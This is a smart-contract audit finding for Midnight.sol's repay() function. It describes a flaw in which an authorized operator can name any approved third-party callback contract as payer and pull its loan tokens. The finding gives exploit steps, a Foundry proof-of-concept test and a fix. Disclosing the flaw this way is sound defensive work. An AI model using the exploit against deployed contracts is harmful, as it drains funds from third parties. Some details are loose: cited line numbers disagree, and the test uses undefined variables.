### Title
Callback Payer Confusion in `repay()` Allows Authorized Operator to Pull Funds from Arbitrary Third-Party Contracts - (File: src/Midnight.sol)

### Summary
The `repay()` function sets `payer = callback` when a non-zero callback is provided, but imposes no constraint that `callback == msg.sender`. An authorized operator for `onBehalf` can supply any third-party contract as `callback`, causing Midnight to pull loan tokens from that contract rather than from the caller, without the victim contract's meaningful consent to this specific repayment.

### Finding Description
The vulnerable code path in `repay()` is:

```solidity
// src/Midnight.sol lines 502–521
function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
    external
{
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    // ...
    address payer = callback != address(0) ? callback : msg.sender;  // line 511
    // ...
    if (callback != address(0)) {
        require(
            IRepayCallback(callback).onRepay(id, market, units, onBehalf, data) == CALLBACK_SUCCESS,
            WrongRepayCallbackReturnValue()
        );
    }
    SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units);  // line 520
}
```

The authorization check on line 505 only verifies that `msg.sender` is authorized for `onBehalf`. There is **no check** that `callback == msg.sender` or that `callback` is in any way related to the caller. The `payer` is unconditionally set to `callback` when non-zero, and tokens are pulled from `payer` on line 520.

**Exploit flow:**

**Preconditions:**
- Attacker (`msg.sender`) is authorized for `onBehalf` via `isAuthorized[onBehalf][attacker] == true`
- `victimContract` implements `IRepayCallback.onRepay()` returning `CALLBACK_SUCCESS`
- `victimContract` has approved Midnight to spend its loan tokens (e.g., via `forceApproveMax` as done in `MidnightBundles.sol` line 332–333)

**Attack:**
1. Attacker calls `repay(market, units, onBehalf, victimContract, data)`
2. Authorization check passes: attacker is authorized for `onBehalf`
3. `payer = victimContract`
4. `victimContract.onRepay(id, market, units, onBehalf, data)` is called — Midnight is `msg.sender` in this call, so `victimContract` cannot identify the original attacker and may return `CALLBACK_SUCCESS`
5. `safeTransferFrom(loanToken, victimContract, Midnight, units)` — pulls `units` of loan tokens from `victimContract`

The victim contract's `onRepay` receives `(id, market, units, onBehalf, data)` but **not** the original `msg.sender` (the attacker). It only knows Midnight called it. A victim contract designed as a legitimate repay callback cannot distinguish a legitimate self-initiated repay from an attacker-initiated one using this interface alone.

Contrast with `take()`, where the payer is constrained to the callback set by the taker (who is `msg.sender` or authorized by `msg.sender`), and the taker is the one who controls their own callback. In `repay()`, the caller controls a callback that pays from a *different* address.

### Impact Explanation
An authorized operator for any borrower can drain loan tokens from any contract that (a) has Midnight approval and (b) implements a compliant `onRepay()`. The victim contract's token balance decreases to repay a debt it did not choose to repay, violating the invariant that "callbacks, ERC20 transfers, multicall, or reentrancy cannot corrupt partial state" and that authorization must only allow intended account delegation, not extend to pulling funds from arbitrary third parties.

### Likelihood Explanation
Preconditions are realistic in production:
- Authorized operators are a core feature (bundlers, routers, smart-contract wallets)
- Contracts that implement `IRepayCallback` and hold Midnight approval exist by design (any repay-callback-based integration)
- The attacker only needs to be authorized for *any* borrower — even a borrower they themselves control — to target a victim callback contract
- The attack is repeatable as long as the victim contract retains Midnight approval and loan token balance

### Recommendation
Require that `callback`, when non-zero, equals `msg.sender`:

```solidity
require(callback == address(0) || callback == msg.sender, InvalidCallback());
```

This mirrors the implicit constraint in `take()` where the taker controls their own callback. Alternatively, require explicit authorization: `isAuthorized[callback][msg.sender]`. This ensures only the payer itself (or a contract it has authorized) can be designated as the repay callback.

### Proof of Concept
```solidity
// Foundry fuzz test
function testRepayCallbackPayerConfusion(uint256 units) public {
    // Setup: attacker authorized for borrower
    vm.prank(borrower);
    midnight.setIsAuthorized(attacker, true, borrower);

    // Setup: victimContract has Midnight approval and implements onRepay → CALLBACK_SUCCESS
    // (e.g., a legitimate repay-callback router with residual approval)
    deal(loanToken, address(victimContract), units);
    vm.prank(address(victimContract));
    IERC20(loanToken).approve(address(midnight), type(uint256).max);

    uint256 victimBalanceBefore = IERC20(loanToken).balanceOf(address(victimContract));

    // Attacker calls repay with callback = victimContract
    vm.prank(attacker);
    midnight.repay(market, units, borrower, address(victimContract), "");

    uint256 victimBalanceAfter = IERC20(loanToken).balanceOf(address(victimContract));

    // Assert: victim's balance decreased — victim paid borrower's debt
    assertLt(victimBalanceAfter, victimBalanceBefore);
    // Assert: borrower's debt decreased
    assertEq(midnight.debtOf(id, borrower), initialDebt - units);
}
```

Expected: `victimBalanceAfter < victimBalanceBefore` and `debtOf(borrower)` decreases, confirming the victim paid the borrower's debt without consent. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** src/Midnight.sol (L502-521)
```text
    function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);

        position[id][onBehalf].debt -= UtilsLib.toUint128(units);
        marketState[id].withdrawable += UtilsLib.toUint128(units);

        address payer = callback != address(0) ? callback : msg.sender;
        emit EventsLib.Repay(msg.sender, id, units, onBehalf, payer);

        if (callback != address(0)) {
            require(
                IRepayCallback(callback).onRepay(id, market, units, onBehalf, data) == CALLBACK_SUCCESS,
                WrongRepayCallbackReturnValue()
            );
        }
        SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units);
    }
```

**File:** src/interfaces/ICallbacks.sol (L20-22)
```text
interface IRepayCallback {
    function onRepay(bytes32 id, Market memory market, uint256 units, address onBehalf, bytes memory data) external returns (bytes32);
}
```

**File:** src/periphery/MidnightBundles.sol (L371-375)
```text
    function forceApproveMax(address token, address spender) internal {
        if (IERC20(token).allowance(address(this), spender) >= type(uint96).max / 2) return;
        safeApprove(token, spender, 0);
        safeApprove(token, spender, type(uint256).max);
    }
```
